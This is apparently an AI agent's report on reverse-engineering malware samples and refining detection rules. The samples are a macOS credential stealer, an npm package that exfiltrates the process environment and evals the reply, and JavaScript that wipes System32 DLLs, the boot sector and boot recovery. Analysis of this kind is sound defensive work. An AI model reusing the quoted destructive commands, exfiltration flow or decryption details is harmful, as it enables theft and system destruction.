scope: Six stranded members individually reverse-engineered and judged. All three original archives remain confirmed malware, without re-judgment. All supplied archive/member hashes verified.
method: Read RULES.md and TAXONOMY.md. Atomscan and cleave facts run on all nine paths; manually trace complete JS bodies, package call paths and both native architectures; independently decrypt both native command copies and every writer hex slot. Do not execute sample code. Final comparable scans use atomscan --no-update --analyze local --mode slow --follow=none -f json, CLEAVE_SKIP_CACHE=1, and rule sources from git HEAD versus this checkout.
changes: Add hostile wallet-extension credential-access profile: validated masked password phishing plus the existing multiple-wallet-ID/storage/file-read profile. This covers a different source from desktop wallets and browser password databases. It neither binds every ID to a read nor claims decryption, a successful copy or exfiltration. Original sample precision is 5.7.

Bind the silent DLL-deletion action to the execSync API imported from child_process. Support direct property imports, destructuring, aliases, const/let/var declarations. Previously a local recorder or an unrelated imported executor could satisfy the execution claim. Actual DLL destruction and ordinary suspicious/notable command evidence remain.

Correct the tagged curl upload description to state password-phishing/file-upload co-occurrence. The matcher does not bind the uploaded contents to collected credentials or establish campaign attribution. No matcher or severity changes for this description correction.

consumer_audit.DLL rule: The only exact consumer is node-silent-system32-dll-wipe, retained. The objectives/impact ancestor suppressor in CrystalX still sees the unchanged suspicious node-system32-dll-glob-deletion profile for the recorder/control shapes. Inspected the existing hostile DLL-wipe fixture outside this batch and existing near misses before narrowing. Positive attack coverage is retained; direct/aliased imports are covered.
consumer_audit.wallet extension addition: Audited objectives/credential-access, wallet and extension ancestor selectors. Python/JavaScript/shell consumers are outside the new Mach-O scope; generic credential-access selectors already see its required hostile phishing finding. No unrelated threshold gains an independent source role.

controls.native: check.py: 7 encrypted-native controls pass (original and renamed-handler positives; missing masked prompt, validation, read, IDs or extension stores negatives). Both encrypted slices are mutated and must decode identically.
controls.source: check_source.py: 22 assertions across 11 cases pass; actual hostile corpus DLL-wipe and direct/aliased/const/let/var imports are positive; local recorder, other module, unrelated executor, visible output, logged errors and specific-file deletion are negative.
controls.existing: testdata/stranded-current-review/check.py: 20 assertions across 15 existing static fixtures pass.
controls.false_positive_demonstration: Before correction, dll-local-recorder.js and dll-other-module.js each matched both the suspicious action and hostile DLL-wipe composite. Imported-alias execution was missed. The final checks reverse those unsupported matches and recover the alias.

comparison.cache_issue: Initial warm-cache native scans contained different supplementary-architecture and neutral findings. Repeating both snapshots with CLEAVE_SKIP_CACHE=1 removed those apparent losses. The final comparison has zero lost IDs or criticality changes on any listed artifact or archive member.

remaining_classifier_disagreements: All six members are individually malicious. v/f/t remain classifier suspicious and p remains classifier benign despite their supported hostile destructive behaviors. Installer and writer are classified hostile. Confirmed archive convictions are unchanged. The older v18 feature specification warning and explicit JS flow limitations remain engine/model constraints; manual source tracing supplies the behavioral evidence.
hostile_coverage_goal: v/f/t/p are below 3-5 hostile traits: each complete member body implements one distinct destructive result, already covered by hostile detections and neutral/suspicious primitives. Inspection of all code and surrounding call paths reveals no additional persistence, theft, escalation, staged-code activation or cleanup in these members. Adding more hostile findings would duplicate or invent effects. The accurate two hostile p findings and all other existing findings are retained.
activation_and_missing_context: osinthell sorgu(userId) ignores userId and invokes a-z actions. Earlier j.js enters a synchronous infinite allocation loop, so p/t/v are not proven reachable through that entrypoint; f precedes j. Writer has missing local module paths. No runtime success, operator authorization, victim privileges or completed exfiltration is supplied. Static attack code establishes the individual verdicts.
remote_stages: Forager attempted the exact Installer /otherassets/plist and /otherassets/ledger.zip URLs into task scratch. Repeated TCP connection timeouts prevented recovery; task fetches were terminated after several minutes. Logs and any temporary provider directories remain in scratch; no payload or provenance was fabricated. The writer response depends on the remote server and is not fetched by transmitting victim data. No downstream behavior beyond available static evidence is claimed.
final_validation: Run make validate as the final action; its outcome is reported in the final response.

artifacts.identification: Universal Mach-O credential stealer posing as Installer
artifacts.reason: A deceptive masked login-password prompt, dscl validation, broad credential/document collection, configured archive upload, trusted-wallet replacement and unauthorized launchd activation establish malicious intent independently of archive conviction.
artifacts.trace: ARM64 main calls system at 0x1000006b8 after command reconstruction; x86-64 main calls system at 0x10000065c. Both encrypted 37077-byte command copies decrypt identically with seed 0x11667, multiplier 0x3785, uint32 multiplication and modulus 35999 (compile-time 09:59:59). The command runs osascript -e with generated AppleScript. Password handling reads a cached hidden file or prompts and validates with dscl. Collection copies Chromium login/cookie/Web Data stores, Firefox/Waterfox key4/logins/cookies/form history, Chromium wallet extensions and Firefox MetaMask IndexedDB, desktop wallets, login and UUID Keychains, Safari cookies/form values, Notes databases/media or Notes automation fallback, and extension-filtered Desktop/Documents files. It archives a random temporary staging tree using ditto, uploads the ZIP with curl --data-binary and removes both tree and ZIP. It fetches a Ledger Live replacement, terminates/removes the installed app using the captured password and extracts into /Applications. It fetches a command, embeds it in a KeepAlive/RunAtLoad system LaunchDaemon, installs/bootstrap-loads with sudo -S and falls back to nohup. Successful credential capture, reads, requests and installation are not observed.

artifacts.marker_note: parser-session writer: covert env export and response execution
artifacts.identification: parser-session 1.1.9 covert environment exporter and HTTP response evaluator
artifacts.reason: The exported logger-shaped function ignores its arguments, sends the complete process environment and host profile to a concealed endpoint and evaluates the response; this is unrelated to legitimate session parsing or logging.
artifacts.trace: Module initialization snapshots process.env, package subModuleVersion, OS platform, hostname, username and MAC addresses from non-internal IPv4 interfaces. g converts hex pairs with parseInt(radix 16) and String.fromCharCode. Decoded table: require, axios, post, HTTPS endpoint, headers, x-secret-header, secret, then. The exported arrow calls require(axios)[post](endpoint,data,{headers:{x-secret-header:secret}})[then](r=>eval(r.data)).catch(()=>{}). Redundant array indexes coerce to the intended property names. Source tracing binds the same data object to the POST and the same response to eval. The extracted tree lacks the required src/package.json; its entrypoint references a missing .pnpm/httpreslog writer and its declared postinstall script is absent. Successful activation is unproven.

artifacts.marker_note: osinthell v.js: silently deletes Windows System32 DLLs
artifacts.reason: A zero-argument export hardcodes recursive, forced, quiet deletion of all System32 DLLs, discarding streams and swallowing errors; it has no repair/servicing interface.
artifacts.trace: The destructured child_process.execSync API is called with del /F /S /Q and a correctly escaped Windows System32 DLL wildcard, shell:true and stdio:ignore. catch is empty. No privilege escalation is implemented; Windows permissions can prevent success.

artifacts.marker_note: osinthell f.js: zeroes physical drive boot sector and partition table
artifacts.reason: An unparameterized silent export zeroes the first sector of a fixed physical disk, destroying boot and partition-table bytes without a backup or restoration interface.
artifacts.trace: fs.openSync opens PhysicalDrive0 with r+; Buffer.alloc creates 512 zero bytes; fs.writeSync writes that same buffer through the same handle at position zero, then closes it. A separate try invokes bootrec /fixmbr, which does not reconstruct the erased partition table. Errors and child output are suppressed. Raw-device access privileges and runtime success are unknown.

artifacts.marker_note: osinthell t.js: silently disables Windows boot recovery
artifacts.reason: The entire zero-argument action silently disables recovery and boot-failure handling, without a restore path or administrative configuration interface.
artifacts.trace: An exported function synchronously runs bcdedit /set {default} bootstatuspolicy ignoreallfailures and bcdedit /set {default} recoveryenabled No with shell:true and stdio:ignore, inside one empty-catch try. Failure of the first command skips the second. No elevation code exists.

artifacts.marker_note: osinthell p.js: truncates regular files across drive roots
artifacts.reason: It indiscriminately truncates regular files at four drive roots, without selecting temporary data or providing a legitimate cleanup function.
artifacts.trace: Loops over C:, D:, E:, F: roots; readdirSync obtains entries; path.join binds each root/entry to full; statSync(full).isFile() gates writeFileSync(full, empty-string). Two-argument default write mode truncates existing file contents. It neither recurses nor deletes directory entries. Nested empty catches suppress errors.
